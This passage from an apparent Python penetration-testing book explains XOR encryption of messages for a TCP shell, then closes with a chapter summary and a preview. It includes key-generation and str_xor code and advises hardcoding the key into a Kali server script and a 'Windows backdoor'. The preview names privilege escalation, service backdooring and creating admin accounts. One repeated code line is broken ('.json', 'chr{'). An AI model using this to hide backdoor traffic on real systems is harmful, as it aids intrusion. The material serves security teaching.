<p class="calibre2">Let's look into the first section. We will generate a random key, which will be used for XOR encryption. Now, our key should be complex enough and match the following criteria: it should contain lowercase, uppercase, digits, and special characters here. Now, the<span class="calibre11"> </span><kbd class="calibre12">for</kbd><span class="calibre11"> </span>loop at the end defines the key size. The key size is 1 KB, which, if you remember in our TCP shell, matches the TCP socket size. The empty string<span class="calibre11"> </span><kbd class="calibre12">.join</kbd> at the start will put the result for the random strings into a sequence and finally, we will store it in a<span class="calibre11"> </span><kbd class="calibre12">key</kbd><span class="calibre11"> </span>variable. So, all in all, the<span class="calibre11"> </span><kbd class="calibre12">for</kbd><span class="calibre11"> </span>loop will generate<span class="calibre11"> </span><kbd class="calibre12">1024</kbd><span class="calibre11"> </span>random strings, which match our criteria, and the<span class="calibre11"> </span><kbd class="calibre12">.join</kbd><span class="calibre11"> </span>is used to gather these strings into a sequence.</p>
<p class="calibre2">On running the code, a key for length<span class="calibre11"> </span><kbd class="calibre12">1024</kbd> will be generated that we can use for encryption. If you run the script one more time, you will get a totally different key with the same size:</p>
<pre class="packt_figure">...<br class="title-page-name"/># here i defined a dedicated function called str_xor, we will pass two values to this function, the first value is the message(s1) that we want to encrypt or decrypt, <br class="title-page-name"/># and the second parameter is the xor key(s2). We were able to bind the encryption and the decryption phases in one function because the xor operation is exactly the<br class="title-page-name"/># same when we encrypt or decrypt, the only difference is that when we encrypt we pass the message in clear text and when we want to decrypt we pass the encrypted message<br class="title-page-name"/><br class="title-page-name"/>def str_xor(s1, s2):<br class="title-page-name"/> return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># first we split the message and the xor key to a list of character pair in tuples format &gt;&gt; for (c1,c2) in zip(s1,s2)<br class="title-page-name"/><br class="title-page-name"/># next we will go through each tuple, and converting them to integer using (ord) function, once they converted into integers we can now <br class="title-page-name"/># perform exclusive OR on them &gt;&gt; ord(c1) ^ ord(c2)<br class="title-page-name"/><br class="title-page-name"/># then convert the result back to ASCII using (chr) function &gt;&gt; chr(ord(c1) ^ ord(c2))<br class="title-page-name"/># last step we will merge the resulting array of characters as a sequence string using &gt;&gt;&gt; "".join function <br class="title-page-name"/><br class="title-page-name"/>#Here we do a quick test <br class="title-page-name"/><br class="title-page-name"/>enc = str_xor(message, key)<br class="title-page-name"/>print 'Encrypted message is: ' + '\n' + enc + '\n' <br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>dec = str_xor(enc, key)<br class="title-page-name"/>print 'Decrypted message is: ' + '\n' + dec<br class="title-page-name"/><br class="title-page-name"/>#Make sure that the SAME Key is HARDCODED in the Server AND client, otherwise you won't be able to decode your own messages!</pre>
<p class="calibre2">In the second part of XOR encryption, keep in mind that the key size should be equal to or greater than the clear-text message. We will pass two values to the dedicated function <kbd class="calibre12">str_xor()</kbd>. The first parameter, <kbd class="calibre12">s1</kbd>, is the message that we want to encrypt or decrypt and the second parameter, <kbd class="calibre12">s2</kbd>, is the XOR key. Notice that the same <kbd class="calibre12">key</kbd> is used for both the encryption and decryption processes. Also, the message could be the encrypted message that we want to decrypt or the clear-text message that we want to encrypt. So, the XOR operation is exactly the same when we encrypt or decrypt. The only difference is that when we encrypt, we pass the message in a clear text and when we want to decrypt, we pass the encrypted message. The following line from the <kbd class="calibre12">XOR Encryption</kbd> script does both the XOR encryption and decryption for us:</p>
<pre class="packt_figure">...<br class="title-page-name"/>return "".json([chr{ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])<br class="title-page-name"/>...</pre>
<p class="calibre2">So, first, we split the message and the XOR key to a list of character pairs in a tuples format. Next, we will go through each tuple and convert them into integers using the <kbd class="calibre12">ord()</kbd> function. Now, once they're converted into integers, we can perform an exclusive XOR on them. Then, in the last part, we will convert the result back to ASCII, using the character or the <kbd class="calibre12">chr()</kbd>, function. In the end, we will merge the resulting array of characters as a sequence, using the <kbd class="calibre12">.join()</kbd> function here. So, in summary, we will print the clear-text message then the encrypted version, and finally, the decrypted one.</p>
<p class="calibre2">After running the script, you'll see in the output the XOR key, the message that we passed, the encrypted message, and the decrypted message. </p>
<p class="calibre2">Each time we run the script, a new key will be generated and hence a new encrypted message will show up.</p>
<div class="packt_infobox">Once you generate your XOR key, make sure that the same key is hardcoded into your Kali server script and the Windows backdoor; otherwise, you won't be able to decrypt your messages.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Summary</h1>
                
            
            <article>
                
<p class="calibre2">In this chapter, we've covered a wide range of topics ranging from bypassing firewalls to interacting with websites. We've performed these tasks after usage of various tools and different methodologies, which enabled us to attack the victim machine with our attacker machine or encrypt and decrypt our messages.</p>
<p class="calibre2">In this next chapter, we'll cover privilege escalations pertaining to weak service file permissions, preparing vulnerable software, breaching legitimate windows service via a backdoor, and creating a new admin account.</p>


            </article>

            
        </section>
    </body></html>